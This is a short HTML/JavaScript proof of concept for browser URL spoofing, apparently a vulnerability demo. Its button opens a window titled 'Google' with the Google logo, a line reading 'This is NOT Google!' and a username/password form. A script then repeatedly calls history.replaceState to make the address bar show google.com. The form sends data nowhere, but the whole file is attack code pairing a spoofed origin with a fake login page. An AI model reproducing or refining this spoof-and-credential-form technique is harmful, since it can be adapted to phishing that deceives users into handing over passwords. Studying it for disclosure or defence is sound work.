<!DOCTYPE html>
<html>
<body>
<button onclick="spoof()">Click to spoof</button>
<script>
function spoof() {
    let win = window.open("", "_blank");
    
    // Create iframe that loads actual content
    let payload = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Google</title>
    </head>
    <body>
        <iframe src="about:blank" style="width:100%; height:100%; border:none;" id="contentFrame"></iframe>
        <script>
            setTimeout(() => {
                var frame = document.getElementById('contentFrame');
                frame.contentWindow.document.write('<div style="text-align:center; font-family:Arial, sans-serif;"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;"><h1>This is NOT Google!</h1><p>Please enter your credentials:</p><form style="margin-top:20px;"><input type="text" placeholder="Username" style="display:block; margin:10px auto; padding:8px; width:200px;"><input type="password" placeholder="Password" style="display:block; margin:10px auto; padding:8px; width:200px;"><button type="submit" style="padding:8px 16px; background-color:#4285F4; color:white; border:none; cursor:pointer;">Sign In</button></form></div>');
                
                // Try to manipulate parent window history
                try {
                    window.history.replaceState(null, null, 'https://www.google.com:8080');
                    setInterval(() => {
                        window.history.replaceState(null, null, 'https://www.google.com:8080/search?q=' + Date.now());
                    }, 100);
                } catch(e) {}
            }, 100);
       <\/script>
    </body>
    </html>`;
    
    win.document.write(payload);
    win.document.close();
}
</script>
</body>
</html>
